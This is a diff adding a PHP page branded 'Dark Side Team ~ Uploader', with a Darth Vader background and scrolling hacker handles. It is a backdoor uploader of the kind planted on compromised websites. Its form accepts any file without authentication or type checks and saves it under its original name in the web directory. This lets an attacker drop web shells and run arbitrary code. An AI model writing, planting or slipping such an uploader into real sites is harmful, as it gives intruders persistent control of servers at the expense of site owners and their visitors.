@@ -1,0 +1,67 @@
+<html>
+<title>Dark Side Team ~ Uploader</title>
+<style type="text/css">
+table {border-collapse: collapse;}
+td, th { border: 1px solid #000000; font-size: 75%; vertical-align: baseline;}
+</style>
+ <style> 
+  body {
+background-color: black;
+background-image: url("https://cdn.shopify.com/s/files/1/0651/7205/products/dark-side-vader-detail_1024x1024.jpg?v=1527502859");
+background-repeat: no-repeat;
+background-size: 100% 100%;
+ }
+} 
+ </style> 
+<body>
+<br>
+<br>
+<br><br>
+<br>
+<br><br>
+<br>
+<br><br>
+<br>
+<br><br>
+<br><br>
+<br>
+<br><br>
+<br>
+<center>
+<font color="yellow" size="30">Dark Side uploader</font>
+
+<br>----------------------------------------------------------------</font>
+<br>
+<br>
+<br>
+<form method="post"  enctype="multipart/form-data">
+<table width="350" border="0" cellpadding="1" cellspacing="1" class="box">
+<tr> 
+<td width="246">
+<input type="hidden" name="MAX_FILE_SIZE" value="200000000000000">
+<input name="userfile" type="file" id="userfile"> 
+</td>
+<td width="80"><input name="upload" type="submit" class="box" id="upload" value=" Upload "></td>
+</tr>
+</table>
+</form>
+
+<?php
+$uploaddir = "";
+$uploadfile = $uploaddir . basename($_FILES['userfile']['name']);
+if (isset($_FILES['userfile']['name'])) {
+        if (move_uploaded_file($_FILES['userfile']['tmp_name'], $uploadfile)) {
+                echo "<font color= #00FF00><center>The file ". basename($_FILES['userfile']['name']) ." sukses beb</center></font>";
+        } else {
+                echo "<font color= #e61e1e><center>gagal cuk!</center></font>";
+        }}?>
+
+<br/><font color= #e61e1e>----------------------------------------------------------------</font>
+<br>
+<br>
+<marquee behavior="scroll" direction="right" scrollamount="100" scrolldelay="40" width="100%"> <font color="red">_____________________________________________________________________________________</marquee>
+<marquee behavior="scroll" direction="left" scrollamount="100" scrolldelay="40" width="100%"> <font color="white">_____________________________________________________________________________________</font></marquee> 
+<div style="font-size:40px;color:green;font-style:Comic Sans Serif;"><marquee behavior="alternate" scrollamount="22">~ Mr.satsat ~ ./ikari404 ~ VerX ~ Mr.5T1Y0 ~</marquue><marquee behavior="scroll" direction="left" scrollamount="100" scrolldelay="40" width="100%"> <font color="white">_____________________________________________________________________________________<br></marquee>
+<marquee behavior="scroll" direction="right" scrollamount="100" scrolldelay="40" width="100%"> <font color="red">_____________________________________________________________________________________</marquee></div>
+</body>
+</html>
